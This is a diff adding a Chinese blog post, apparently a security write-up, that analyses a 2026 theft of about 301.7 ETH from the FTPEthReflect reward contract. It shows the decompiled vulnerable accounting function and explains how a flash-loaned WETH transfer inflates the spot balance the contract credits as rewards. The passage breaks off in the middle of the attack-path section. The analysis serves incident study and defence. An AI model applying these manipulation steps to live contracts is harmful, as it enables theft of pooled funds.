@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>FTPEthReflect Attack Analysis - YINHUI&#39;s BLOG</title><meta name="author" content="yinhui">
+<meta name="description" content="2026-08，以太坊主网区块 25606412，攻击者从 FTPEthReflect 合约的共享 ETH 池中提走了 301.704684 ETH。
+"><meta name="keywords" content='security, attack, FTPEthReflect'>
+  <meta itemprop="name" content="FTPEthReflect Attack Analysis">
+  <meta itemprop="description" content="2026-08，以太坊主网区块 25606412，攻击者从 FTPEthReflect 合约的共享 ETH 池中提走了 301.704684 ETH。">
+  <meta itemprop="datePublished" content="2026-08-07T11:39:38+08:00">
+  <meta itemprop="dateModified" content="2026-08-07T11:39:38+08:00">
+  <meta itemprop="wordCount" content="5087">
+  <meta itemprop="image" content="https://yinhui1984.github.io/images/avatar.png">
+  <meta itemprop="keywords" content="Security,Attack,FTPEthReflect"><meta property="og:url" content="https://yinhui1984.github.io/ftpethreflect-attack-analysis/">
+  <meta property="og:site_name" content="YINHUI&#39;s BLOG">
+  <meta property="og:title" content="FTPEthReflect Attack Analysis">
+  <meta property="og:description" content="2026-08，以太坊主网区块 25606412，攻击者从 FTPEthReflect 合约的共享 ETH 池中提走了 301.704684 ETH。">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-08-07T11:39:38+08:00">
+    <meta property="article:modified_time" content="2026-08-07T11:39:38+08:00">
+    <meta property="article:tag" content="Security">
+    <meta property="article:tag" content="Attack">
+    <meta property="article:tag" content="FTPEthReflect">
+    <meta property="og:image" content="https://yinhui1984.github.io/images/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://yinhui1984.github.io/images/avatar.png">
+  <meta name="twitter:title" content="FTPEthReflect Attack Analysis">
+  <meta name="twitter:description" content="2026-08，以太坊主网区块 25606412，攻击者从 FTPEthReflect 合约的共享 ETH 池中提走了 301.704684 ETH。">
+<meta name="application-name" content="YINHUI&#39;s BLOG">
+<meta name="apple-mobile-web-app-title" content="YINHUI&#39;s BLOG"><meta name="theme-color" data-light="#ffffff" data-dark="#ffffff" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://yinhui1984.github.io/ftpethreflect-attack-analysis/" title="FTPEthReflect Attack Analysis - YINHUI&#39;s BLOG" /><link rel="prev" type="text/html" href="https://yinhui1984.github.io/lienfinance-attack-analysis/" title="LienFinance Attack Analysis" /><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "FTPEthReflect Attack Analysis",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/yinhui1984.github.io\/ftpethreflect-attack-analysis\/"
+    },"image": ["https:\/\/yinhui1984.github.io\/images\/avatar.png"],"genre": "posts","keywords": "security, attack, FTPEthReflect","wordcount":  5087 ,
+    "url": "https:\/\/yinhui1984.github.io\/ftpethreflect-attack-analysis\/","datePublished": "2026-08-07T11:39:38+08:00","dateModified": "2026-08-07T11:39:38+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "yinhui"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="fixed" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">文章</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item">
+              <a class="menu-link" href="/">首页</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="切换主题" title="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="YINHUI&#39;s BLOG"><span class="header-title-text">YINHUI&#39;s BLOG</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="切换主题"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item"><a class="menu-link" href="/">首页</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>FTPEthReflect Attack Analysis</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      yinhui</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/security/" class="post-category" title="分类 - Security"><i class="fa-regular fa-folder" aria-hidden="true"></i> Security</a></span></div><div class="post-meta-line"><span title="发布于 2026-08-07 11:39:38"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2026-08-07">2026-08-07</time></span>&nbsp;<span title="5087 字"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>约 5100 字</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>预计阅读 11 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-概述">1. 概述</a></li>
+    <li><a href="#2-目标合约与业务模型">2. 目标合约与业务模型</a></li>
+    <li><a href="#3-漏洞现货余额差被当作新流入">3. 漏洞：现货余额差被当作新流入</a></li>
+    <li><a href="#4-攻击路径设计中的三个核心问题">4. 攻击路径设计中的三个核心问题</a>
+      <ul>
+        <li><a href="#41-如何触发记账代币回调条件">4.1 如何触发记账（代币回调条件）</a></li>
+        <li><a href="#42-注入的资本如何完整回收核心">4.2 注入的资本如何完整回收（核心）</a></li>
+        <li><a href="#43-提款-cap-的-return-陷阱">4.3 提款 cap 的 return 陷阱</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-反机器人模块与绕过">5. 反机器人模块与绕过</a></li>
+    <li><a href="#6-真实攻击交易复盘">6. 真实攻击交易复盘</a></li>
+    <li><a href="#7-本地复现验证">7. 本地复现验证</a></li>
+    <li><a href="#8-修复建议">8. 修复建议</a></li>
+    <li><a href="#附录1-关键地址">附录1 ：关键地址</a></li>
+    <li><a href="#附录2-poc">附录2: POC</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>2026-08，以太坊主网区块 25606412，攻击者从 FTPEthReflect 合约的共享 ETH 池中提走了 301.704684 ETH。</p>
+<h2 class="heading-element" id="1-概述"><span>1. 概述</span>
+  <a href="#1-%e6%a6%82%e8%bf%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>2026-08，以太坊主网区块 25606412，一笔交易（<code>0x90f40d3c3b60370f7287d51d972ef54596c46e98f21af91b03a4e84c5e410f64</code>）从 FTPEthReflect 合约（<code>0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB</code>，下称 target）的共享 ETH 池中提走了 301.704684 ETH。</p>
+<ul>
+<li>攻击前池子余额：400.651 ETH</li>
+<li>攻击后池子余额：≈ 99 ETH</li>
+<li>攻击者 EOA：<code>0x61e7Ad696215688d274C729A4cD0FbbC88FC4f85</code></li>
+<li>闪贷来源：Morpho（<code>0xBBBBbbBBbb9CC5e90e3b3Afa64bdAf62C37eEFfCb</code>），单笔 13,997.8 WETH</li>
+</ul>
+<p>根本原因是 target 的买入记账函数 <code>trackPurchase</code> 把 <strong>pair 的 WETH 现货余额差</strong>当成&quot;新流入奖励&quot;记账，而该余额是可被任意转账直接操纵的现货状态。本文给出完整的漏洞机理、攻击路径设计与真实攻击复盘，并附反编译源码（dedaub，unverified；关键语义均经本地 fork 复现确认）。</p>
+<h2 class="heading-element" id="2-目标合约与业务模型"><span>2. 目标合约与业务模型</span>
+  <a href="#2-%e7%9b%ae%e6%a0%87%e5%90%88%e7%ba%a6%e4%b8%8e%e4%b8%9a%e5%8a%a1%e6%a8%a1%e5%9e%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>target 是一个&quot;共享 ETH 反射奖励服务&quot;：白名单代币（dataSource，共 28 个，全部为 2021 年部署的 meme 币）接入后，用户买卖代币时由代币合约回调 target 记账，用户凭记账从共享池按比例提款。</p>
+<p>核心存储（slot 语义，经链上数据与本地复现确认）：</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>存储</th>
+            <th>语义</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>mapping_2</td>
+            <td>白名单（dataSource → bool）</td>
+        </tr>
+        <tr>
+            <td>mapping_4</td>
+            <td>trackPurchase 基线：上次记录的 pair WETH 余额</td>
+        </tr>
+        <tr>
+            <td>mapping_5</td>
+            <td>记账点累计</td>
+        </tr>
+        <tr>
+            <td>mapping_6</td>
+            <td>真实注入累计（仅 trackSell 增加）</td>
+        </tr>
+        <tr>
+            <td>mapping_b</td>
+            <td>每个 ds 的提款 cap（真实资金分账）</td>
+        </tr>
+        <tr>
+            <td>mapping_11/12/13</td>
+            <td>holder 的已提记账点 / 当次可提部分 / 快照残余</td>
+        </tr>
+        <tr>
+            <td>stor_17</td>
+            <td>100000（分母）</td>
+        </tr>
+        <tr>
+            <td>stor_18</td>
+            <td>305（费率）</td>
+        </tr>
+    </tbody>
+  </table>
+</div><p>资产负债表（分析块 25606411）：池子 400.651 ETH，Σ mapping_b = 400.511 ETH。<strong>cap 精确分账——正常路径下无人能提取超出自己分账的金额。</strong> 问题只可能出在&quot;分账怎么被记出来&quot;。</p>
+<h2 class="heading-element" id="3-漏洞现货余额差被当作新流入"><span>3. 漏洞：现货余额差被当作新流入</span>
+  <a href="#3-%e6%bc%8f%e6%b4%9e%e7%8e%b0%e8%b4%a7%e4%bd%99%e9%a2%9d%e5%b7%ae%e8%a2%ab%e5%bd%93%e4%bd%9c%e6%96%b0%e6%b5%81%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>代币买入时回调 <code>trackPurchase(holder)</code>（选择器 0x3627301e）。反编译源码（AI 重构版）：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">func_3627301e</span><span class="p">(</span><span class="kt">address</span> <span class="n">varg0</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">mapping_2</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span> <span class="s">&#34;Unauthorized&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">_getOwnership</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span> <span class="s">&#34;Uninitialized&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">rewardToken</span> <span class="o">=</span> <span class="n">mapping_d</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">rewardToken</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">IERC20Like</span><span class="p">(</span><span class="n">rewardToken</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">mapping_9</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]);</span> <span class="c1">// ← 读 pair 的 WETH 现货余额
+</span></span></span><span class="line"><span class="cl">    <span class="n">mapping_4</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>                                            <span class="c1">// 基线更新
+</span></span></span><span class="line"><span class="cl">    <span class="c1">// ...（dedaub 伪影：delta 计算的写读时序在反编译中有混淆，
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//      真实语义经 fork 复现裁决为 max(0, balanceOf(pair) - m4)）
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="n">v1</span> <span class="o">-</span> <span class="n">m4</span><span class="p">)</span> <span class="o">*</span> <span class="n">mapping_8</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">/</span> <span class="n">stor_17</span>
+</span></span><span class="line"><span class="cl">               <span class="o">-</span> <span class="p">((</span><span class="n">v1</span> <span class="o">-</span> <span class="n">m4</span><span class="p">)</span> <span class="o">*</span> <span class="n">mapping_8</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">/</span> <span class="n">stor_17</span><span class="p">)</span> <span class="o">*</span> <span class="n">stor_18</span> <span class="o">/</span> <span class="n">stor_17</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 记账 = max(0, 余额差) × alloc% × (1 - 费率)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">mapping_5</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="n">v9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mapping_11</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">varg0</span><span class="p">]</span> <span class="o">=</span> <span class="n">mapping_5</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">v12</span> <span class="o">=</span> <span class="n">stor_17</span> <span class="o">-</span> <span class="n">mapping_7</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+</span> <span class="n">_trackSell</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">varg0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mapping_12</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">varg0</span><span class="p">]</span> <span class="o">=</span> <span class="n">v12</span> <span class="o">*</span> <span class="n">v9</span> <span class="o">/</span> <span class="n">stor_17</span><span class="p">;</span>  <span class="c1">// 当次可提部分
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">_withdraw</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">varg0</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>记账公式（fork 复现确认）：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">记账 = max(0, WETH.balanceOf(pair) − m4) × alloc% × (1 − 305/100000)</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>问题在于：</p>
+<ol>
+<li><strong><code>WETH.balanceOf(pair)</code> 是现货余额</strong>——任何地址可以用一笔普通 <code>WETH.transfer(pair, X)</code> 直接抬高，不需要真实买入，不产生任何滑点或税费；</li>
+<li><strong>基线 m4 只在买入时更新</strong>——卖出、转账、捐赠都不会刷新基线；</li>
+<li><strong>记账记给&quot;当次触发回调的 holder&quot;</strong>——攻击者可以让自己成为那个 holder。</li>
+</ol>
+<p>因此攻击者可以把 pair 的 WETH 余额灌大 X，触发一次买入回调，即获得 ≈ X × alloc% × 0.997 的记账，再按记账提款。基线 m4 被推高后，同样的手法需要更大的注入才能再次产生差额——但每个 ds 只需攻击一次（提空其 cap）。</p>
+<h2 class="heading-element" id="4-攻击路径设计中的三个核心问题"><span>4. 攻击路径设计中的三个核心问题</span>
+  <a href="#4-%e6%94%bb%e5%87%bb%e8%b7%af%e5%be%84%e8%ae%be%e8%ae%a1%e4%b8%ad%e7%9a%84%e4%b8%89%e4%b8%aa%e6%a0%b8%e5%bf%83%e9%97%ae%e9%a2%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="41-如何触发记账代币回调条件"><span>4.1 如何触发记账（代币回调条件）</span>
+  <a href="#41-%e5%a6%82%e4%bd%95%e8%a7%a6%e5%8f%91%e8%ae%b0%e8%b4%a6%e4%bb%a3%e5%b8%81%e5%9b%9e%e8%b0%83%e6%9d%a1%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>代币侧的记账触发逻辑（已验证源码 CoinMerge.sol，0x119007&hellip;）：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">_trackEthReflection</span><span class="p">(</span><span class="kt">address</span> <span class="n">_sender</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_recipient</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
